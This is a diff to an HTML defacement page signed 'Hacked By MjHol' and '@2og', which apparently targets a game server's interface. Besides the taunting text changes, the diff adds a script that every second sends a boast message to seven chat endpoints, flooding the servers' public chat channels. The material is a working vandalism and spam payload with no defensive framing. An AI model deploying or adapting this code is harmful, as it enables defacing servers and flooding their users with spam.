@@ -174,8 +174,8 @@ Hacked By [ <span class="name">MjHol</span> ]
 </div>
 
 <div class="discord">
-<a href="https://discord.gg/obe">
-Discord.gg/obe
+<a href="@2og Was Here">
+@2og Was Here
 </a>
 </div>
 
@@ -215,7 +215,7 @@ Oops, your server is down!
 // =======================
 function createRain() {
     const container = document.getElementById('rain-container');
-    const texts = ['MjHol', 'discord.gg/obe'];
+    const texts = ['MjHol', 'You Were Never Safe', '@2og Was Here'];
     
     // توزيع متساوي: 10 قطرات لكل منطقة (إجمالي 30 قطرة)
     const leftCount = 10;     // اليسار (0% - 30%)
@@ -382,12 +382,27 @@ observer.observe(document.body, { attributes: true, childList: true, subtree: tr
 // =======================
 
 
-
 // بدء تأثير المطر المتتابع عند تحميل الصفحة
 window.onload = function() {
     createRain();
 };
 </script>
 
+<script>
+   
+const msg = ` MjHol Was Here / @2og  `;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+
+</script>
+    
 </body> 
 </html>
